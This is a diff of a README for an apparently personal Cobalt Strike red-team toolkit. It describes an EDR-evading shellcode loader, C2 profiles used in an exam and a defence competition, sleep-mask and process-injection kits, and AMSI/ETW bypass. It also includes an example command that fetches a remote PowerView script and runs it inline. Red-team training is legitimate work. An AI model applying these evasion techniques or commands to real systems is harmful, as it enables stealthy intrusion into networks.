@@ -3,17 +3,17 @@ Various resources to enhance Cobalt Strike's functionality and its ability to ev
 
 ### Contents
 #### Loader
-- loader ⇒ used to bypass Windows Defender and Elastic EDR detections to run Cobalt Strike beacon shellcode `<protocol>_x64.xprocess.bin`
+- [loader](loader/) ⇒ used to bypass Windows Defender and Elastic EDR detections to run Cobalt Strike beacon shellcode `<protocol>_x64.xprocess.bin`
 #### Profile
-- crtl.profile ⇒ malleable C2 profile used on CRTL exam, based on [webbug.profile](https://github.com/Cobalt-Strike/Malleable-C2-Profiles/blob/master/normal/webbug.profile)
-- mwccdc.profile ⇒ malleable C2 profile used for MWCCDC regionals in 2024, based on [microsoftupdate_getonly.profile](https://github.com/Cobalt-Strike/Malleable-C2-Profiles/blob/master/normal/microsoftupdate_getonly.profile)
+- [crtl.profile](profile/crtl.profile) ⇒ malleable C2 profile used on CRTL exam, based on [webbug.profile](https://github.com/Cobalt-Strike/Malleable-C2-Profiles/blob/master/normal/webbug.profile)
+- [mwccdc.profile](profile/mwccdc.profile) ⇒ malleable C2 profile used for MWCCDC regionals in 2024, based on [microsoftupdate_getonly.profile](https://github.com/Cobalt-Strike/Malleable-C2-Profiles/blob/master/normal/microsoftupdate_getonly.profile)
 #### Kits
-- sleepmask ⇒ Cobalt Strike sleep mask kit modifications to spoof msedge.exe legitimate thread callstack
-- process_inject ⇒ Cobalt Strike process injection kit modifications that implement NtMapViewOfSection technique - not necessary since this option is available in the malleable C2 profile, but it's a good example of how to use kernel32.dll and ntdll.dll Windows API function calls to create your own injection. I found concrete examples of this to be severely lacking on the internet.
+- [sleepmask](kits/sleepmask/) ⇒ Cobalt Strike sleep mask kit modifications to spoof msedge.exe legitimate thread callstack
+- [process_inject](kits/process_inject/) ⇒ Cobalt Strike process injection kit modifications that implement NtMapViewOfSection technique - not necessary since this option is available in the malleable C2 profile, but it's a good example of how to use kernel32.dll and ntdll.dll Windows API function calls to create your own injection. I found concrete examples of this to be severely lacking on the internet.
 #### Post-Ex
-- powerpick.cs ⇒ C# code for running unmanaged PowerShell, providing the PowerShell command as an argument(s) - compatible with inline-x.cna
-- inline-x.cna ⇒ modified [inlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) cna file that makes running .NET assemblies and PowerShell inline easier
-- command-all.cna ⇒ execute `run` or `shell` command on *all* active Cobalt Strike beacons, without having to interact with each one individually
+- [powerpick.cs](post-ex/powerpick.cs) ⇒ C# code for running unmanaged PowerShell, providing the PowerShell command as an argument(s) - compatible with inline-x.cna
+- [inline-x.cna](post-ex/inline-x.cna) ⇒ modified [inlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) cna file that makes running .NET assemblies and PowerShell inline easier
+- [command-all.cna](post-ex/command-all.cna) ⇒ execute `run` or `shell` command on *all* active Cobalt Strike beacons, without having to interact with each one individually
 
 **Note:** When building powerpick.cs, you'll have to include a reference to **System.Management.Automation.dll**, which is located in `C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\<version>`
 
@@ -27,22 +27,22 @@ Various resources to enhance Cobalt Strike's functionality and its ability to ev
 2. Read Stager ⇒ read shellcode from disk
 3. Stageless ⇒ include shellcode directly in PE as a resource (in .rsrc section) - requires encoding the shellcode so it's not caught by Elastic
 #### Building the loader
-1. (stageless only) generate encoded Cobalt Strike shellcode file with encoder.py - see comments in file for more info
-2. open .sln file in [Visual Studio](https://visualstudio.microsoft.com/free-developer-offers/)
-3. (stageless only) follow instructions in encoder.py to include encoded shellcode file as a resource
+1. (stageless only) generate encoded Cobalt Strike shellcode file with [encoder.py](loader/helpers/encoder.py) - see comments for more info
+2. open [.sln](loader/loader.sln) file in [Visual Studio](https://visualstudio.microsoft.com/free-developer-offers/)
+3. (stageless only) follow instructions in [encoder.py](loader/helpers/encoder.py) to include encoded shellcode file as a resource
 4. select your desired build
 5. Build Solution
 
 ### Inline X Usage
-1. Change `$powerpickPath` to specify the path of your unmanaged PowerShell exe (built from powerpick.cs)
+1. Change `$powerpickPath` to specify the path of your unmanaged PowerShell exe (built from [powerpick.cs](post-ex/powerpick.cs))
 2. Change `$etw` and `$amsi` as you see fit - I wanted it to always bypass AMSI and ETW, which is why I set these values to 1
 3. Load script into Cobalt Strike
 4. Execute .NET assembly inline with `x execute-assembly <exe> <args>`
 5. Execute unmanaged powershell inline with `x powerpick <powershell>`
    - I made this compatible with `powershell-import`, but I noticed that using this method of importing scripts generally gets detected by EDR. If you'd like to remove this functionality altogether, comment/remove lines 257 and 258.
-   - As an alternative, use `--import <script>` (eg. `x --import http://example.com/PowerView.ps1 powerpick Get-Domain`). You can specify a local file on disk or remotely hosted file with http/https. This only supports *one* script. I'm too lazy to extend the functionality to support multiple scripts when one is usually all you need.
+   - As an alternative, use `--import <script>` (eg. `x --import https://example.com/PowerView.ps1 powerpick Get-Domain`). You can specify a local file on disk or remotely hosted file with http/https. This only supports *one* script. I'm too lazy to extend the functionality to support multiple scripts when one is usually all you need.
 
-**Note:** I commented out the portions of the script that parse double quotes (") in arguments differently because I found this to get in the way, especially when running PowerShell commands. If you don't like this, you are welcome to uncomment the code portions starting on line 87.
+**Note:** I commented out the portions of the script that parse arguments in single (') and double quotes (") as a single argument because most of my tooling handles or requires these quotes. For example, the unmanaged PowerShell implementation [powerpick.cs](post-ex/powerpick.cs) takes arguments passed in, converts them to one string, and runs that string. Treating multiple words as a single argument in PowerShell commands thus requires passing in those quotes as-is. You may run into instances where you *do* need to parse arguments in quotes as a single argument, much like you would when running the .NET executable in a terminal. If this is the case, you are welcome to uncomment the code portions starting on line 87 and reload the script.
 
 ### Command All Usage
 1. Load script into Cobalt Strike
